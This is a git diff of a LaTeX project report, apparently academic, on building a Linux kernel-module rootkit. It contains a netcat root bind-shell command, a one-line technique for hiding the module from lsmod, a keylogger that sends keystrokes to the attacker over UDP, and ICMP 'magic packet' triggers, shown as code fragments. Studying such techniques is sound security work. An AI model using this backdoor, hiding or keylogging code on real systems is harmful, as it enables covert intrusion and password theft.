@@ -53,7 +53,8 @@
   escapeinside={\%*}{*)},          % if you want to add LaTeX within your code
   keywordstyle=\color{blue},       % keyword style
   stringstyle=\color{mymauve},      % string literal style
-  language=C
+  language=C,
+  numbers=left
 }
 %\usepackage{times} % Uncomment to use the Times New Roman font
 
@@ -65,7 +66,14 @@
 
 
 \author{Clemens \textsc{Brunner}\\
-        Michael \textsc{Fröwis}} % Author name
+        Michael \textsc{Fröwis} \\
+        \\
+        \\
+	supervised by \\
+	Matthias \textsc{Gander} \\ \\} % Author name
+
+
+
 
 
 \date{\today} % Date for the report
@@ -91,12 +99,11 @@ In the remaining part of this section we want to give a basic introduction into 
 
 Almost every modern operating system has some sort of kernel extension mechanism. Without such a mechanism everything that has to run in kernel mode has to be included into the kernel binary. This would not only be a massive wast of space, but would also require to rebuild the entire kernel every time we need new functionality. The aim of a kernel extension mechanism is to extend the kernel without rebuilding the kernel or even rebooting it. 
 
-Different operating systems have different names for such extensions as for example kernel-mode driver (Windows), kernel extension (OS X) or loadable kernel module (Linux). Because we develop a Linux rootkit we use the term kernel module in the following. 
+Different operating systems have different names for such extensions as for example kernel-mode driver (Windows), kernel extension (OS X) or loadable kernel module or LKM for short (Linux). Because we develop a Linux rootkit we use the term kernel module in the following. 
 
-A kernel module in its simplest form is nothing more than a piece of code, usually written in the C programming language that can be loaded into kernel space at runtime. It has a setup and a exit function which are called if the module is loaded or unloaded. Listing \ref{simple} gives an example of a very simple kernel module. The only thing it does it logs "Hello world" to the system log when loaded and "Goodby world" when unloaded.
+A kernel module in its simplest form is nothing more than a piece of code, usually written in the C programming language that can be loaded into kernel space at runtime. It has a setup (\texttt{init\_module}) and an exit function (\texttt{cleanup\_module}) which are called if the module is loaded or unloaded. Listing \ref{simple} gives an example of a very simple kernel module. The only thing it does it logs ``Hello world'' to the system log when loaded and ``Goodbye world'' when unloaded.
 
 \begin{lstlisting}[caption=Source: \url{http://www.tldp.org/LDP/lkmpg/2.6/html/x121.html}., label=simple]
-
 /*  
  *  hello-1.c - The simplest kernel module.
  */
@@ -120,7 +127,6 @@ void cleanup_module(void)
 
 module_init(init_module);
 module_exit(cleanup_module);
-
 \end{lstlisting}
 
 All the code inside a kernel module is run in the context of the kernel and therefore it can do anything possible on your computer, without any protection. That means even something as small as a single bad pointer could possibly wipe your hard drive. Another difference that has to be mentioned is that you don't use the usual C standard lib but code that is exported by the kernel itself. 
@@ -129,15 +135,13 @@ In the implementation section we will use a kernel module to implement our rootk
 \newpage
 \section{Implementation}
 \label{sec:impl}
-
+In this section we want to describe some of the implementation details that were important for the success of the project.
 \subsection{Hiding}
-As already mention in the introduction a rootkit should mask its existence as good as possible to prevent the detection of the possibly malicious operations. Although a kernel module is not visible as a process on the system it can be easily revealed via the \shellcmdinline{lsmod} command, which lists all currently loaded kernel modules. To prevent our module from the most obvious way of detection we want to hide it from \shellcmdinline{lsmod}. 
+As mentioned above a rootkit should mask its existence as much as possible in order to prevent the detection of itself and its activity. Although a kernel module is not visible as a process on the system it can be easily revealed via the \shellcmdinline{lsmod} command, which lists all currently loaded kernel modules. To prevent the module from being detected via a common means of detection (i.e. \shellcmdinline{lsmod}) certain measures have to be taken.
 
 This sounds hard at first but it is rather easy. We can use the special exported symbol \texttt{extern struct module \_\_this\_module;} which points to the module we are currently in. The module structure, see Listing \ref{module}, has a field \texttt{list} that points to the list of all modules. 
 
 \begin{lstlisting}[caption=Extract from Linux/include/linux/module.h, label=module]
-
-
 struct module {
          enum module_state state;
  
@@ -147,25 +151,18 @@ struct module {
          /* Unique handle for this module */
          char name[MODULE_NAME_LEN];
 
-         .
-         .
-         .
-
          // skipped for brevity
 }
- 
 \end{lstlisting}
 
-That means to hide the module from detection we only need to delete it from the list of modules and we are done. Luckily the kernel provides us with handy list manipulation functions. Finally our effort boils down to one line of code as you can see in Listing \ref{hide}.
+That means to hide the module from detection we only need to delete the reference to it from the list of modules and we are done. Luckily the kernel provides us with handy list manipulation functions. Finally our effort boils down to one line of code as you can see in Listing \ref{hide}.
 
 \begin{lstlisting}[caption=Hide the current module., label=hide]
 	list_del(&(__this_module.list));
 \end{lstlisting}
 
-
-
 \subsection{Backdoor}
-The dream of every attacker is a backdoor into every system he is interested in. As we have already compromised the system in our scenario and have gained root access (installation of the rootkit) the task of spawning a backdoor to gain access to the system any time we want is rather easy. What we also wanted to achieve is that the backdoor is not active all the time but can be activated whenever needed. Again magic packets, as described in \ref{sec:magicpackage} are used to activate the backdoor. The backdoor itself is achieved by simply spawning a \shellcmdinline{netcat -l -p 6666 -e /bin/sh} process in userland. This is done via the \shellcmdinline{call\_usermodehelper} function. Listing \ref{backdoor} shows the spawning function.
+For an adversary it proves to be beneficial to have immediate access to a system. Our initial assumption was that we have already compromised the system, i.e. have a rootshell. Hence, to ease re-entry to the system it is essential to install a backdoor, which turns out to be trivial. What we also wanted to achieve is that the backdoor is not active all the time but can be activated whenever needed. Again magic packets, as described in \ref{sec:magicpackage} are used to activate the backdoor. The backdoor itself is created by leveraging netcat, via the following command: \shellcmdinline{netcat -l -p 6666 -e /bin/sh} in userland (ring 3). This is done via the \shellcmdinline{call\_usermodehelper} function. Listing \ref{backdoor} shows the spawning function.
 
 \begin{lstlisting}[caption=Span netcat in userland., label=backdoor]
 void shell_tasklet_fn(unsigned long data){
@@ -179,7 +176,7 @@ void shell_tasklet_fn(unsigned long data){
 }
 \end{lstlisting}
 
-The hard part was not the creation of the process itself but doing it inside of an interrupt handler (reception of magic packet). Many functions can not be called safely (long running functions and so on) inside the context of an interrupt. Because of that we used the tasklet API to defer the execution of \shellcmdinline{call\_usermodehelper} to a save point in time into the kernel context. Listing \ref{tasklet} shows the usage of the tasklet API to start the \shellcmdinline{shell\_tasklet\_fn} in a deferred and safe manner.
+The hard part was not the creation of the process itself but doing it inside of an interrupt handler (reception of magic packet). Many functions can't be called safely (long running functions and so on) inside the context of an interrupt. Because of that we used the tasklet API to defer the execution of \shellcmdinline{call\_usermodehelper} to a save point in time into the kernel context. Listing \ref{tasklet} shows the usage of the tasklet API to start the \shellcmdinline{shell\_tasklet\_fn} in a deferred and safe manner.
 
  \begin{lstlisting}[caption=Tasklet API., label=tasklet]
 DECLARE_TASKLET(shell_tasklet, shell_tasklet_fn, 0);
@@ -192,7 +189,7 @@ void start_remote_shell(void){
 
 
 \subsection{Keylogging}
-This section deals with keylogging in the linux kernel. Keylogging describes the process of intercepting all input-keys, this includes also all passwords, usernames or bank account informations assuming the user entered this information, from a keyboard.  Our rootkit intercepts all keys and sends them to the attacker. To make it harder to detect the rootkit with the keylogging function it is possible to activate and deactivate it with magic packets, see \ref{sec:magicpackage}.  \newline
+This section deals with keylogging in the linux kernel. Keylogging describes the process of intercepting all input-keys, this includes all passwords, usernames or bank account information assuming the user entered this information, from a keyboard. Our rootkit intercepts all keys and sends them to the attacker. To make it harder to detect the rootkit with the keylogging function it is possible to activate and deactivate it with magic packets, see \ref{sec:magicpackage}.  \newline
 The linux kernel already provides a method to intercept all keys, to use this implementation it is necessary to include the keyboard header and define a new \lstinline{struct notifier_block keyboard_notifier}, see Listing \ref{includeKey}.
 
 \begin{lstlisting}[caption=Keyboard header., label=includeKey]
@@ -218,24 +215,15 @@ unregister_keyboard_notifier(&keyboard_notifier);
 
 
 \subsection{Networking and Activation}
-In the best case our rootkit should run without being detected and without leaving any traces on the attacked system. To do so we don't log keystrokes to file but send them over the network. We used so called magic packets for the activation and deactivation of a service. A magic packet should be a packet which is hard to detect or in other words a packet that is not easily distinguishable from normal packets. Our magic packets are normal ping request with the anomaly that the icmp header field id is equal to the icmp code field. If we intercept a magic packet we compare the code with our predefined de/activation codes.
+Ideally our rootkit runs without being detected and without leaving any traces on the attacked system. To do so we don't log keystrokes to file but send them over the network. We used so-called magic packets for the activation and deactivation of a service. A magic packet should be a packet which is hard to detect or in other words a packet that is not easily distinguishable from normal packets. Our magic packets are normal ping request with the anomaly that the icmp header field id is equal to the icmp code field. If we intercept a magic packet we compare the code with our predefined de/activation codes.
 \label{sec:magicpackage}
 \newline Communication-wise two different types of packets are used.
 \begin{itemize}
 	\item ICMP Packets (for the activation packets)
-	\item UDP Sockets (sending keystrokes)
+	\item UDP (sending keystrokes)
 \end{itemize}
 \subsubsection{ICMP Packets}
-Magic packets can activate(deactivate) the keylogger, hide(unhide) the rootkit module or open a backdoor shell with root access. The following values are used for code and id to assign the desired functionality.
-\begin{itemize}
-	\item[122:] \lstinline{KEYLOGGER_ACTIVATION_CODE}
-	\item[123:] \lstinline{KEYLOGGER_DEACTIVATION_CODE}
-	\item[124:] \lstinline{HIDEMODULE_ACTIVATION_CODE}
-	\item[125:] \lstinline{HIDEMODULE_DEACTIVATION_CODE}
-	\item[126:] \lstinline{BACKDOOR_ACTIVATION_CODE}
-\end{itemize}
-
-
+Magic packets can activate (deactivate) the keylogger, hide (unhide) the rootkit module or open a backdoor shell with root access. The following values are used in the code to identify the desired functionality: 122 - activate keylogger, 123 - deactivate keylogger, 124 - hide module, 125 - unhide module, 126 - open backdoor.
 
 To intercept the packets a new \lstinline{netfilter_hook} is added with the netfilter library, see Listing \ref{netfilter}. 
 \begin{lstlisting}[caption=Netfilter Hook, label=netfilter]
@@ -244,7 +232,6 @@ To intercept the packets a new \lstinline{netfilter_hook} is added with the netf
 
 static struct nf_hook_ops netfilter_hook;
 
-
 netfilter_hook.hook = (nf_hookfn*) filter_magic_packets;
 netfilter_hook.hooknum = 0;
 netfilter_hook.pf = PF_INET;
@@ -252,13 +239,11 @@ netfilter_hook.priority = 1;
 
 nf_register_hook(&netfilter_hook);
 nf_register_hook(&netfilter_hook);
-
-
 \end{lstlisting}
 
-The netfilter hook catches all IP packets. To get ping packets only the icmp packets are unpacked form the IP messages. For the evaluation only packets with the already defined properties are used (id==code).
+The netfilter hook catches all IP packets. To detect ping packets only the ICMP packets need to be unpacked from the IP messages. Pings are just a special kind of ICMP packets namly ICMP echo requests (type 8).  For the evaluation only packets with the already defined properties are used (id==code).
 
-\subsubsection{UPD Sockets}
+\subsubsection{UDP Sockets}
 To send the keys to the attacker UPD datagram packets are used.
 
 \newpage
